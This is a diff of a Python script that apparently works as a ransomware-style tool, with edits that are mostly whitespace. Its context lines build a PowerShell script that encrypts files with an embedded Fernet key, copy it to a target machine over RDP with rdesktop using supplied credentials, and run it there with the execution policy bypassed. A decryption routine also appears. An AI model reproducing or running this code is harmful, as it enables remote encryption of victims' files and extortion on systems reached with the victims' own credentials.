@@ -1,4 +1,3 @@
-from distutils.core import setup
 import os
 import subprocess
 from cryptography.fernet import Fernet
@@ -34,7 +33,6 @@ foreach ($file in $files) {
 }
 '''.format(self.key.decode())
 
-
         # Generate a random script name
         script_name = "encrypt_script.ps1"
         script_path = os.path.join(os.getcwd(), script_name)
@@ -46,11 +44,11 @@ foreach ($file in $files) {
         # Copy the script file to the target VM using RDP (rdesktop)
         copy_script_command = f'echo {script_path} | rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" {target_vm_ip}'
         subprocess.Popen(copy_script_command, shell=True)
+
         # Run the script on the target VM using RDP (rdesktop)
         run_script_command = f'rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" -s "powershell -ExecutionPolicy Bypass -File /home/{rdp_username}/{script_name}" {target_vm_ip}'
         subprocess.Popen(run_script_command, shell=True)
 
-    
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder(self, folder_path):
         for root, dirs, files in os.walk(folder_path):
@@ -91,4 +89,5 @@ while True:
     else:
         print("Invalid choice. Please choose a valid option.")
         break
+
 
